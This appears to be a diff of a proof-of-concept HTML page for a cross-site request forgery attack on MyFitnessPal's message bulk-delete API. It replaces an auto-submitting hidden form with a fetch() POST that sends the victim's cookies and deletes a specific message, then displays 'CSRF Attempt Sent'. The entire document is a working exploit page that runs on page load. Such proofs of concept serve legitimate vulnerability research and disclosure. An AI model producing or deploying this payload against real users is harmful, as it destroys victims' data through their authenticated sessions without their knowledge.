@@ -1,10 +1,19 @@
 <html>
   <body>
-    <form id="csrf" action="https://www.myfitnesspal.com/api/services/messages/bulk_delete" method="POST" enctype="application/json">
-      <input type="hidden" name='{"item":[216410201],"sent":false}'>
-    </form>
     <script>
-      document.getElementById("csrf").submit();
+      fetch("https://www.myfitnesspal.com/api/services/messages/bulk_delete", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          item: [216410201],
+          sent: false
+        })
+      }).then(response => response.text())
+        .then(data => console.log(data));
     </script>
+    <h1>CSRF Attempt Sent</h1>
   </body>
 </html>
